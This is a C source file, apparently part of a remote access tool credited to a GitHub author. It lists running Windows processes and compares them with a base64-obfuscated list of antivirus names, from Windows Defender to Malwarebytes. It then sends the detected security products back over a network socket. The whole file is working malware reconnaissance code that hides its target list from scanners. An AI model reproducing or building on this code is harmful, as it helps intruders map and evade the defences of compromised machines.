#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define MAX_NAME_LENGTH 1024

int lowSearch(SOCKET conn);

/*

  Creado por "an0mal1a"

       https://github.com/an0mal1a

*/
 
char Detected[1024];
char *ptr = Detected; 
int remaining_space = sizeof(Detected); 

char *NameFinder(char *AvName){
    char *DefAvName = (char *)malloc(MAX_NAME_LENGTH);

    if (strcmp(AvName, "MsMpEng.exe") == 0 || strcmp(AvName, "SecHealthUI") == 0 || strcmp(AvName, "SecurityHealth") == 0)
        strcpy(DefAvName, "Windows Defender");

    else if (strstr(AvName, "Norton") != NULL)
        strcpy(DefAvName, "Norton"); 

    else if (strstr(AvName, "McAfee") != NULL)       
        strcpy(DefAvName, "McaFee");
        
    else if (strstr(AvName, "Panda") != NULL || strstr(AvName, "PSUAMain") != NULL)   
        strcpy(DefAvName, "Panda Dome");

    else if (strstr(AvName, "Avast") != NULL)
        strcpy(DefAvName, "Avast");

    else if (strstr(AvName, "AVG") != NULL)
        strcpy(DefAvName, "AVG");

    else if (strstr(AvName, "Kaspersky") != NULL)
        strcpy(DefAvName, "Kaspersky");

    else if (strstr(AvName, "Bitdefender") != NULL)
        strcpy(DefAvName, "Bitdefender");

    else if (strstr(AvName, "ESET NOD32") != NULL)
        strcpy(DefAvName, "ESET NOD32");

    else if (strstr(AvName, "Avira") != NULL)
        strcpy(DefAvName, "Avira");

    else if (strstr(AvName, "mbamtray") != NULL || strstr(AvName, "Malwarebytes") != NULL)
        strcpy(DefAvName, "Malwarebytes");
        
    return DefAvName;
}

int lowSearch(SOCKET conn){

    char * a_v_lst[] = {
        "TXNNcEVuZy5leGU=",
        "U2VjSGVhbHRoVUk=",
        "U2VjdXJpdHlIZWFsdGhTeXN0cmF5",
        "Tm9ydG9u",
        "TWNhRmVl",
        "UGFuZGE=",
        "UFNVQU1haW4=",
        "QXZhc3Q=",
        "QVZH",
        "S2FzcGVyc2t5",
        "Qml0ZGVmZW5kZXI=",
        "RVNFVCBOT0QzMg==",
        "VHJlbmQgTWljcm8=",
        "QXZpcmE=",
        "U29waG9z",
        "TWFsd2FyZWJ5dGVz",
        "bWJhbXRyYXk=",
        "UGFuZGE=",
        "d2Vicm9vdCBzZWN1cmVhbnl3aGVyZQ==",
        "Zi1zZWN1cmU=",
        NULL
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        int count = 0;
        if (Process32First(hSnapshot, &pe32)) {
            do {
                //printf("PID: %u, Process Name: %s\n", pe32.th32ProcessID, pe32.szExeFile);
                for (int i = 0; a_v_lst[i] != NULL; i++){
                    size_t input_length = strlen(a_v_lst[i]);
                    size_t output_length;
                    unsigned char *decoded_data = base64_decode(a_v_lst[i], input_length, &output_length);

                    char* ProcessName = malloc(input_length + 1);
                    snprintf(ProcessName, input_length, "%.*s", (int)output_length, decoded_data);
                    
                    //printf("Process Name: %s   |    AvName: %s\n", pe32.szExeFile, ProcessName);
                    if (strstr(pe32.szExeFile, ProcessName) != NULL){   
                        int written = snprintf(ptr, remaining_space, "\n[!] Detected Antivirus: %s | %s", NameFinder(ProcessName), pe32.szExeFile);


                        if (written >= 0 && written < remaining_space){
                            ptr += written; 
                            remaining_space -= written; 
                        }
                        else
                            memset(Detected, 0, 1024);
                        
                        break;
                    }

                    free(decoded_data);
                    free(ProcessName);
                }

                count++;
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
        send(conn, Detected, sizeof(Detected), 0);
    }

    memset(Detected, 0, 1024);
    return 0;
}

